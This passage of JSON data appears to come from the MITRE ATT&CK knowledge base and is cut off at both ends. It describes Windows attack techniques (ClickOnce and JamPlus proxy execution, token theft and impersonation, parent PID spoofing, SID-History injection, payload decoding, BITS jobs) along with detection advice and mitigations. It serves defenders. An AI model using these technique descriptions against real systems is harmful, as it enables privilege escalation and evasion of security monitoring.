href=\"https://i.blackhat.com/USA-19/Wednesday/us-19-Burke-ClickOnce-And-Youre-In-When-Appref-Ms-Abuse-Is-Operating-As-Intended-wp.pdf?_gl=1*1jv89bf*_gcl_au*NjAyMzkzMjc3LjE3MjQ4MDk4OTQ.*_ga*MTk5OTA3ODkwMC4xNzI0ODA5ODk0*_ga_K4JK67TFYV*MTcyNDgwOTg5NC4xLjEuMTcyNDgwOTk1Ny4wLjAuMA..&_ga=2.256219723.1512103758.1724809895-1999078900.1724809894\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Burke/CISA ClickOnce Paper)</a>","detection":"","platforms":["Windows"],"dataSources":["Process: Process Creation","Command: Command Execution","Process: Process Metadata","Module: Module Load"],"mitigations":[{"id":"M1021","name":"Restrict Web-Based Content","description":"Disable ClickOnce installations from the internet using the following registry key: \n<code>\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\.NETFramework\\Security\\TrustManager\\PromptingLevel — Internet:Disabled</code> <a href=\"https://www.netspi.com/blog/technical-blog/adversary-simulation/all-you-need-is-one-a-clickonce-love-story/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NetSPI ClickOnce)</a>"},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"Disable ClickOnce installations from the internet using the following registry key: \n<code>\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\.NETFramework\\Security\\TrustManager\\PromptingLevel — Internet:Disabled</code> <a href=\"https://www.netspi.com/blog/technical-blog/adversary-simulation/all-you-need-is-one-a-clickonce-love-story/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NetSPI ClickOnce)</a> <a href=\"https://learn.microsoft.com/en-us/visualstudio/deployment/how-to-configure-the-clickonce-trust-prompt-behavior?view=vs-2022&tabs=csharp\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Learn ClickOnce Config)</a>\n\nClickOnce may not be necessary within an environment and should be disabled if not being used."},{"id":"M1045","name":"Code Signing","description":"Enforce binary and application integrity with digital signature verification to prevent untrusted code from executing. <a href=\"https://learn.microsoft.com/en-us/visualstudio/deployment/clickonce-and-authenticode?view=vs-2022\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Learn ClickOnce and Authenticode)</a>"}]},{"id":"T1127.003","name":"JamPlus","description":"Adversaries may use <code>JamPlus</code> to proxy the execution of a malicious script. <code>JamPlus</code> is a build utility tool for code and data build systems. It works with several popular compilers and can be used for generating workspaces in code editors such as Visual Studio. <a href=\"https://jamplus.github.io/jamplus/quick_start.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: JamPlus manual)</a>\n\nAdversaries may abuse the <code>JamPlus</code> build utility to execute malicious scripts via a <code>.jam</code> file, which describes the build process and required dependencies. Because the malicious script is executed from a reputable developer tool, it may subvert application control security systems such as Smart App Control. <a href=\"https://cyble.com/blog/reputation-hijacking-with-jamplus-a-maneuver-to-bypass-smart-app-control-sac/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cyble)</a> <a href=\"https://www.elastic.co/security-labs/dismantling-smart-app-control\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic Security Labs)</a>","detection":"","platforms":["Windows"],"dataSources":[],"mitigations":[{"id":"M1038","name":"Execution Prevention","description":"Consider blocking or restricting JamPlus if not required."},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"JamPlus may not be necessary within a given environment and should be removed if not used."}]}]},{"id":"T1134","name":"Access Token Manipulation","description":"Adversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls. Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token.\n\nAn adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing. These token can then be applied to an existing process (i.e. Token Impersonation/Theft) or used to spawn a new process (i.e. Create Process with Token). An adversary must already be in a privileged user context (i.e. administrator) to steal a token. However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level. An adversary can then use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system. <a href=\"https://pentestlab.blog/2017/04/03/token-manipulation/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Pentestlab Token Manipulation)</a>\n\nAny standard user can use the <code>runas</code> command, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account. There are also other mechanisms, such as Active Directory fields, that can be used to modify access tokens.","detection":"If an adversary is using a standard command-line shell, analysts can detect token manipulation by auditing command-line activity. Specifically, analysts should look for use of the <code>runas</code> command. Detailed command-line logging is not enabled by default in Windows. <a href=\"https://technet.microsoft.com/en-us/windows-server-docs/identity/ad-ds/manage/component-updates/command-line-process-auditing\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Command-line Logging)</a>\n\nIf an adversary is using a payload that calls the Windows token APIs directly, analysts can detect token manipulation only through careful analysis of user network activity, examination of running processes, and correlation with other endpoint and network behavior. \n\nThere are many Windows API calls a payload can take advantage of to manipulate access tokens (e.g., <code>LogonUser</code> <a href=\"https://msdn.microsoft.com/en-us/library/windows/desktop/aa378184(v=vs.85).aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft LogonUser)</a>, <code>DuplicateTokenEx</code> <a href=\"https://msdn.microsoft.com/en-us/library/windows/desktop/aa446617(v=vs.85).aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft DuplicateTokenEx)</a>, and <code>ImpersonateLoggedOnUser</code> <a href=\"https://msdn.microsoft.com/en-us/library/windows/desktop/aa378612(v=vs.85).aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft ImpersonateLoggedOnUser)</a>). Please see the referenced Windows API pages for more information.\n\nQuery systems for process and thread token information and look for inconsistencies such as user owns processes impersonating the local SYSTEM account. <a href=\"https://www.blackhat.com/docs/eu-17/materials/eu-17-Atkinson-A-Process-Is-No-One-Hunting-For-Token-Manipulation.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: BlackHat Atkinson Winchester Token Manipulation)</a>\n\nLook for inconsistencies between the various fields that store PPID information, such as the EventHeader ProcessId from data collected via Event Tracing for Windows (ETW), Creator Process ID/Name from Windows event logs, and the ProcessID and ParentProcessID (which are also produced from ETW and other utilities such as Task Manager and Process Explorer). The ETW provided EventHeader ProcessId identifies the actual parent process.","platforms":["Windows"],"dataSources":["Process: OS API Execution","Command: Command Execution","User Account: User Account Metadata","Process: Process Metadata","Process: Process Creation","Active Directory: Active Directory Object Modification"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"An adversary must already have administrator level access on the local system to make full use of this technique; be sure to restrict users and accounts to the least privileges they require."},{"id":"M1026","name":"Privileged Account Management","description":"Limit permissions so that users and user groups cannot create tokens. This setting should be defined for the local system account only. GPO: Computer Configuration &gt; [Policies] &gt; Windows Settings &gt; Security Settings &gt; Local Policies &gt; User Rights Assignment: Create a token object. <a href=\"https://docs.microsoft.com/windows/device-security/security-policy-settings/create-a-token-object\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Create Token)</a> Also define who can create a process level token to only the local and network service through GPO: Computer Configuration &gt; [Policies] &gt; Windows Settings &gt; Security Settings &gt; Local Policies &gt; User Rights Assignment: Replace a process level token. <a href=\"https://docs.microsoft.com/windows/device-security/security-policy-settings/replace-a-process-level-token\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Replace Process Token)</a>\n\nAdministrators should log in as a standard user but run their tools with administrator privileges using the built-in access token manipulation command <code>runas</code>. <a href=\"https://technet.microsoft.com/en-us/library/bb490994.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft runas)</a>"}],"subTechniques":[{"id":"T1134.001","name":"Token Impersonation/Theft","description":"Adversaries may duplicate then impersonate another user's existing token to escalate privileges and bypass access controls. For example, an adversary can duplicate an existing token using <code>DuplicateToken</code> or <code>DuplicateTokenEx</code>. <a href=\"https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetoken\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: DuplicateToken function)</a> The token can then be used with <code>ImpersonateLoggedOnUser</code> to allow the calling thread to impersonate a logged on user's security context, or with <code>SetThreadToken</code> to assign the impersonated token to a thread.\n\nAn adversary may perform Token Impersonation/Theft when they have a specific, existing process they want to assign the duplicated token to. For example, this may be useful for when the target user has a non-network logon session on the system.\n\nWhen an adversary would instead use a duplicated token to create a new process rather than attaching to an existing process, they can additionally Create Process with Token using <code>CreateProcessWithTokenW</code> or <code>CreateProcessAsUserW</code>. Token Impersonation/Theft is also distinct from Make and Impersonate Token in that it refers to duplicating an existing token, rather than creating a new one.","detection":"If an adversary is using a standard command-line shell, analysts can detect token manipulation by auditing command-line activity. Specifically, analysts should look for use of the <code>runas</code> command. Detailed command-line logging is not enabled by default in Windows. <a href=\"https://technet.microsoft.com/en-us/windows-server-docs/identity/ad-ds/manage/component-updates/command-line-process-auditing\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Command-line Logging)</a>\n\nAnalysts can also monitor for use of Windows APIs such as <code>DuplicateToken(Ex)</code>, <code> ImpersonateLoggedOnUser </code>, and <code> SetThreadToken </code> and correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators.","platforms":["Windows"],"dataSources":["Command: Command Execution","Process: OS API Execution"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"An adversary must already have administrator level access on the local system to make full use of this technique; be sure to restrict users and accounts to the least privileges they require."},{"id":"M1026","name":"Privileged Account Management","description":"Limit permissions so that users and user groups cannot create tokens. This setting should be defined for the local system account only. GPO: Computer Configuration &gt; [Policies] &gt; Windows Settings &gt; Security Settings &gt; Local Policies &gt; User Rights Assignment: Create a token object. <a href=\"https://docs.microsoft.com/windows/device-security/security-policy-settings/create-a-token-object\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Create Token)</a> Also define who can create a process level token to only the local and network service through GPO: Computer Configuration &gt; [Policies] &gt; Windows Settings &gt; Security Settings &gt; Local Policies &gt; User Rights Assignment: Replace a process level token. <a href=\"https://docs.microsoft.com/windows/device-security/security-policy-settings/replace-a-process-level-token\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Replace Process Token)</a>\n\nAdministrators should log in as a standard user but run their tools with administrator privileges using the built-in access token manipulation command <code>runas</code>. <a href=\"https://technet.microsoft.com/en-us/library/bb490994.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft runas)</a>"}]},{"id":"T1134.002","name":"Create Process with Token","description":"Adversaries may create a new process with an existing token to escalate privileges and bypass access controls. Processes can be created with the token and resulting security context of another user using features such as <code>CreateProcessWithTokenW</code> and <code>runas</code>. <a href=\"https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525(v=ws.11)\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft RunAs)</a>\n\nCreating processes with a token not associated with the current user may require the credentials of the target user, specific privileges to impersonate that user, or access to the token to be used. For example, the token could be duplicated via Token Impersonation/Theft or created via Make and Impersonate Token before being used to create a process.\n\nWhile this technique is distinct from Token Impersonation/Theft, the techniques can be used in conjunction where a token is duplicated and then used to create a new process.","detection":"If an adversary is using a standard command-line shell (i.e. Windows Command Shell), analysts may detect token manipulation by auditing command-line activity. Specifically, analysts should look for use of the <code>runas</code> command or similar artifacts. Detailed command-line logging is not enabled by default in Windows. <a href=\"https://technet.microsoft.com/en-us/windows-server-docs/identity/ad-ds/manage/component-updates/command-line-process-auditing\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Command-line Logging)</a>\n\nIf an adversary is using a payload that calls the Windows token APIs directly, analysts may detect token manipulation only through careful analysis of user activity, examination of running processes, and correlation with other endpoint and network behavior.\n\nAnalysts can also monitor for use of Windows APIs such as <code>CreateProcessWithTokenW</code> and correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators.","platforms":["Windows"],"dataSources":["Command: Command Execution","Process: OS API Execution"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"An adversary must already have administrator level access on the local system to make full use of this technique; be sure to restrict users and accounts to the least privileges they require."},{"id":"M1026","name":"Privileged Account Management","description":"Limit permissions so that users and user groups cannot create tokens. This setting should be defined for the local system account only. GPO: Computer Configuration &gt; [Policies] &gt; Windows Settings &gt; Security Settings &gt; Local Policies &gt; User Rights Assignment: Create a token object. <a href=\"https://docs.microsoft.com/windows/device-security/security-policy-settings/create-a-token-object\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Create Token)</a> Also define who can create a process level token to only the local and network service through GPO: Computer Configuration &gt; [Policies] &gt; Windows Settings &gt; Security Settings &gt; Local Policies &gt; User Rights Assignment: Replace a process level token. <a href=\"https://docs.microsoft.com/windows/device-security/security-policy-settings/replace-a-process-level-token\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Replace Process Token)</a>\n\nAdministrators should log in as a standard user but run their tools with administrator privileges using the built-in access token manipulation command <code>runas</code>. <a href=\"https://technet.microsoft.com/en-us/library/bb490994.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft runas)</a>"}]},{"id":"T1134.003","name":"Make and Impersonate Token","description":"Adversaries may make new tokens and impersonate users to escalate privileges and bypass access controls. For example, if an adversary has a username and password but the user is not logged onto the system the adversary can then create a logon session for the user using the <code>LogonUser</code> function. <a href=\"https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-logonuserw\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: LogonUserW function)</a> The function will return a copy of the new session's access token and the adversary can use <code>SetThreadToken</code> to assign the token to a thread.\n\nThis behavior is distinct from Token Impersonation/Theft in that this refers to creating a new user token instead of stealing or duplicating an existing one.","detection":"If an adversary is using a standard command-line shell, analysts can detect token manipulation by auditing command-line activity. Specifically, analysts should look for use of the <code>runas</code> command. Detailed command-line logging is not enabled by default in Windows. <a href=\"https://technet.microsoft.com/en-us/windows-server-docs/identity/ad-ds/manage/component-updates/command-line-process-auditing\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Command-line Logging)</a>\n\nIf an adversary is using a payload that calls the Windows token APIs directly, analysts can detect token manipulation only through careful analysis of user network activity, examination of running processes, and correlation with other endpoint and network behavior.\n\nAnalysts can also monitor for use of Windows APIs such as <code>LogonUser</code> and <code> SetThreadToken</code> and correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators.","platforms":["Windows"],"dataSources":["Process: OS API Execution","Command: Command Execution"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"An adversary must already have administrator level access on the local system to make full use of this technique; be sure to restrict users and accounts to the least privileges they require."},{"id":"M1026","name":"Privileged Account Management","description":"Limit permissions so that users and user groups cannot create tokens. This setting should be defined for the local system account only. GPO: Computer Configuration &gt; [Policies] &gt; Windows Settings &gt; Security Settings &gt; Local Policies &gt; User Rights Assignment: Create a token object. <a href=\"https://docs.microsoft.com/windows/device-security/security-policy-settings/create-a-token-object\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Create Token)</a> Also define who can create a process level token to only the local and network service through GPO: Computer Configuration &gt; [Policies] &gt; Windows Settings &gt; Security Settings &gt; Local Policies &gt; User Rights Assignment: Replace a process level token. <a href=\"https://docs.microsoft.com/windows/device-security/security-policy-settings/replace-a-process-level-token\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Replace Process Token)</a>\n\nAdministrators should log in as a standard user but run their tools with administrator privileges using the built-in access token manipulation command <code>runas</code>. <a href=\"https://technet.microsoft.com/en-us/library/bb490994.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft runas)</a>"}]},{"id":"T1134.004","name":"Parent PID Spoofing","description":"Adversaries may spoof the parent process identifier (PPID) of a new process to evade process-monitoring defenses or to elevate privileges. New processes are typically spawned directly from their parent, or calling, process unless explicitly specified. One way of explicitly assigning the PPID of a new process is via the <code>CreateProcess</code> API call, which supports a parameter that defines the PPID to use. <a href=\"https://blog.didierstevens.com/2009/11/22/quickpost-selectmyparent-or-playing-with-the-windows-process-tree/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: DidierStevens SelectMyParent Nov 2009)</a> This functionality is used by Windows features such as User Account Control (UAC) to correctly set the PPID after a requested elevated process is spawned by SYSTEM (typically via <code>svchost.exe</code> or <code>consent.exe</code>) rather than the current user context. <a href=\"https://docs.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft UAC Nov 2018)</a>\n\nAdversaries may abuse these mechanisms to evade defenses, such as those blocking processes spawning directly from Office documents, and analysis targeting unusual/potentially malicious parent-child process relationships, such as spoofing the PPID of PowerShell/Rundll32 to be <code>explorer.exe</code> rather than an Office document delivered as part of Spearphishing Attachment. <a href=\"https://www.countercept.com/blog/detecting-parent-pid-spoofing/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CounterCept PPID Spoofing Dec 2018)</a> This spoofing could be executed via Visual Basic within a malicious Office document or any code that can perform Native API. <a href=\"https://blog.christophetd.fr/building-an-office-macro-to-spoof-process-parent-and-command-line/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CTD PPID Spoofing Macro Mar 2019)</a> <a href=\"https://www.countercept.com/blog/detecting-parent-pid-spoofing/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CounterCept PPID Spoofing Dec 2018)</a>\n\nExplicitly assigning the PPID may also enable elevated privileges given appropriate access rights to the parent process. For example, an adversary in a privileged user context (i.e. administrator) may spawn a new process and assign the parent as a process running as SYSTEM (such as <code>lsass.exe</code>), causing the new process to be elevated via the inherited access token. <a href=\"https://blog.xpnsec.com/becoming-system/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: XPNSec PPID Nov 2017)</a>","detection":"Look for inconsistencies between the various fields that store PPID information, such as the EventHeader ProcessId from data collected via Event Tracing for Windows (ETW), Creator Process ID/Name from Windows event logs, and the ProcessID and ParentProcessID (which are also produced from ETW and other utilities such as Task Manager and Process Explorer). The ETW provided EventHeader ProcessId identifies the actual parent process. <a href=\"https://www.countercept.com/blog/detecting-parent-pid-spoofing/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CounterCept PPID Spoofing Dec 2018)</a>\n\nMonitor and analyze API calls to <code>CreateProcess</code>/<code>CreateProcessA</code>, specifically those from user/potentially malicious processes and with parameters explicitly assigning PPIDs (ex: the Process Creation Flags of 0x8XXX, indicating that the process is being created with extended startup information <a href=\"https://docs.microsoft.com/windows/desktop/ProcThread/process-creation-flags\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Process Creation Flags May 2018)</a>). Malicious use of <code>CreateProcess</code>/<code>CreateProcessA</code> may also be proceeded by a call to <code>UpdateProcThreadAttribute</code>, which may be necessary to update process creation attributes. <a href=\"https://www.securityinbits.com/malware-analysis/parent-pid-spoofing-stage-2-ataware-ransomware-part-3\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Secuirtyinbits Ataware3 May 2019)</a> This may generate false positives from normal UAC elevation behavior, so compare to a system baseline/understanding of normal system activity if possible.","platforms":["Windows"],"dataSources":["Process: Process Creation","Process: OS API Execution","Process: Process Metadata"],"mitigations":[]},{"id":"T1134.005","name":"SID-History Injection","description":"Adversaries may use SID-History Injection to escalate privileges and bypass access controls. The Windows security identifier (SID) is a unique value that identifies a user or group account. SIDs are used by Windows security in both security descriptors and access tokens. <a href=\"https://msdn.microsoft.com/library/windows/desktop/aa379571.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft SID)</a> An account can hold additional SIDs in the SID-History Active Directory attribute <a href=\"https://msdn.microsoft.com/library/ms679833.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft SID-History Attribute)</a>, allowing inter-operable account migration between domains (e.g., all values in SID-History are included in access tokens).\n\nWith Domain Administrator (or equivalent) rights, harvested or well-known SID values <a href=\"https://support.microsoft.com/help/243330/well-known-security-identifiers-in-windows-operating-systems\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Well Known SIDs Jun 2017)</a> may be inserted into SID-History to enable impersonation of arbitrary users/groups such as Enterprise Administrators. This manipulation may result in elevated access to local resources and/or access to otherwise inaccessible domains via lateral movement techniques such as Remote Services, SMB/Windows Admin Shares, or Windows Remote Management.","detection":"Examine data in user’s SID-History attributes using the PowerShell <code>Get-ADUser</code> cmdlet <a href=\"https://technet.microsoft.com/library/ee617241.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Get-ADUser)</a>, especially users who have SID-History values from the same domain. <a href=\"https://adsecurity.org/?p=1772\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AdSecurity SID History Sept 2015)</a> Also monitor account management events on Domain Controllers for successful and failed changes to SID-History. <a href=\"https://adsecurity.org/?p=1772\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AdSecurity SID History Sept 2015)</a> <a href=\"https://msdn.microsoft.com/library/ms677982.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft DsAddSidHistory)</a>\n\nMonitor for Windows API calls to the <code>DsAddSidHistory</code> function. <a href=\"https://msdn.microsoft.com/library/ms677982.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft DsAddSidHistory)</a>","platforms":["Windows"],"dataSources":["Active Directory: Active Directory Object Modification","Process: OS API Execution","User Account: User Account Metadata"],"mitigations":[{"id":"M1015","name":"Active Directory Configuration","description":"Clean up SID-History attributes after legitimate account migration is complete.\n\nConsider applying SID Filtering to interforest trusts, such as forest trusts and external trusts, to exclude SID-History from requests to access domain resources. SID Filtering ensures that any authentication requests over a trust only contain SIDs of security principals from the trusted domain (i.e preventing the trusted domain from claiming a user has membership in groups outside of the domain).\n\nSID Filtering of forest trusts is enabled by default, but may have been disabled in some cases to allow a child domain to transitively access forest trusts. SID Filtering of external trusts is automatically enabled on all created external trusts using Server 2003 or later domain controllers. <a href=\"https://technet.microsoft.com/library/cc755321.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Trust Considerations Nov 2014)</a> <a href=\"https://technet.microsoft.com/library/cc794757.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft SID Filtering Quarantining Jan 2009)</a> However note that SID Filtering is not automatically applied to legacy trusts or may have been deliberately disabled to allow inter-domain access to resources.\n\nSID Filtering can be applied by: <a href=\"https://technet.microsoft.com/library/cc835085.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Netdom Trust Sept 2012)</a>\n\n* Disabling SIDHistory on forest trusts using the netdom tool (<code>netdom trust /domain: /EnableSIDHistory:no</code> on the domain controller)\n\n* Applying SID Filter Quarantining to external trusts using the netdom tool (<code>netdom trust &lt;TrustingDomainName&gt; /domain:&lt;TrustedDomainName&gt; /quarantine:yes</code> on the domain controller)\n\n* Applying SID Filtering to domain trusts within a single forest is not recommended as it is an unsupported configuration and can cause breaking changes. <a href=\"https://technet.microsoft.com/library/cc835085.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Netdom Trust Sept 2012)</a> <a href=\"https://adsecurity.org/?p=1640\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AdSecurity Kerberos GT Aug 2015)</a> If a domain within a forest is untrustworthy then it should not be a member of the forest. In this situation it is necessary to first split the trusted and untrusted domains into separate forests where SID Filtering can be applied to an interforest trust"}]}]},{"id":"T1140","name":"Deobfuscate/Decode Files or Information","description":"Adversaries may use Obfuscated Files or Information to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.\n\nOne such example is the use of certutil to decode a remote access tool portable executable file that has been hidden inside a certificate file. <a href=\"https://blog.malwarebytes.com/cybercrime/social-engineering-cybercrime/2017/03/new-targeted-attack-saudi-arabia-government/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Malwarebytes Targeted Attack against Saudi Arabia)</a> Another example is using the Windows <code>copy /b</code> or <code>type</code> command to reassemble binary fragments into a malicious payload. <a href=\"https://www.carbonblack.com/2016/09/23/security-advisory-variants-well-known-adware-families-discovered-include-sophisticated-obfuscation-techniques-previously-associated-nation-state-attacks/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Carbon Black Obfuscation Sept 2016)</a> <a href=\"https://www.sentinelone.com/labs/operation-tainted-love-chinese-apts-target-telcos-in-new-attacks/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Sentinel One Tainted Love 2023)</a>\n\nSometimes a user's action may be required to open it for deobfuscation or decryption as part of User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. <a href=\"https://www.volexity.com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Volexity PowerDuke November 2016)</a>","detection":"Detecting the action of deobfuscating or decoding files or information may be difficult depending on the implementation. If the functionality is contained within malware and uses the Windows API, then attempting to detect malicious behavior before or after the action may yield better results than attempting to perform analysis on loaded libraries or API calls. If scripts are used, then collecting the scripts for analysis may be necessary. Perform process and command-line monitoring to detect potentially malicious behavior related to scripts and system utilities such as certutil.\n\nMonitor the execution file paths and command-line arguments for common archive file applications and extensions, such as those for Zip and RAR archive tools, and correlate with other suspicious behavior to reduce false positives from normal user and administrator behavior.","platforms":["ESXi","Linux","macOS","Windows"],"dataSources":["Process: Process Creation","Script: Script Execution","File: File Modification"],"mitigations":[],"subTechniques":[]},{"id":"T1197","name":"BITS Jobs","description":"Adversaries may abuse BITS jobs to persistently execute code and perform various background tasks. Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through Component Object Model (COM). <a href=\"https://msdn.microsoft.com/library/windows/desktop/ms680573.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft COM)</a> <a href=\"https://msdn.microsoft.com/library/windows/desktop/bb968799.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft BITS)</a> BITS is commonly used by updaters, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications. File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations.\n\nThe interface to create and manage BITS jobs is accessible through PowerShell and the BITSAdmin tool. <a href=\"https://msdn.microsoft.com/library/windows/desktop/bb968799.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft BITS)</a> <a href=\"https://msdn.microsoft.com/library/aa362813.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft BITSAdmin)</a>\n\nAdversaries may abuse BITS to download (e.g. Ingress Tool Transfer), execute, and even clean up after running malicious code (e.g. Indicator Removal). BITS tasks are self-contained in the BITS job database, without new files or registry modifications, and often permitted by host firewalls. <a href=\"https://www.secureworks.com/blog/malware-lingers-with-bits\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CTU BITS Malware June 2016)</a> <a href=\"https://arstechnica.com/information-technology/2007/05/malware-piggybacks-on-windows-background-intelligent-transfer-service/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mondok Windows PiggyBack BITS May 2007)</a> <a href=\"https://www.symantec.com/connect/blogs/malware-update-windows-update\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Symantec BITS May 2007)</a> BITS enabled execution may also enable persistence by creating long-standing jobs (the default maximum lifetime is 90 days and extendable) or invoking an arbitrary program when a job completes or errors (including after system reboots). <a href=\"https://researchcenter.paloaltonetworks.com/2017/11/unit42-uboatrat-navigates-east-asia/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: PaloAlto UBoatRAT Nov 2017)</a> <a href=\"https://www.secureworks.com/blog/malware-lingers-with-bits\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CTU BITS Malware June 2016)</a>\n\nBITS upload functionalities can also be used to perform Exfiltration Over Alternative Protocol. <a href=\"https://www.secureworks.com/blog/malware-lingers-with-bits\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CTU BITS Malware June 2016)</a>","detection":"BITS runs as a service and its status can be checked with the Sc query utility (<code>sc query bits</code>). <a href=\"https://technet.microsoft.com/library/dd939934.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Issues with BITS July 2011)</a> Active BITS tasks can be enumerated using the BITSAdmin tool (<code>bitsadmin /list /allusers /verbose</code>). <a href=\"https://msdn.microsoft.com/library/windows/desktop/bb968799.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft BITS)</a>\n\nMonitor usage of the BITSAdmin tool (especially the ‘Transfer’, 'Create', 'AddFile', 'SetNotifyFlags', 'SetNotifyCmdLine', 'SetMinRetryDelay', 'SetCustomHeaders', and 'Resume' command options) <a href=\"https://msdn.microsoft.com/library/windows/desktop/bb968799.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft BITS)</a> Admin logs, PowerShell logs, and the Windows Event log for BITS activity. <a 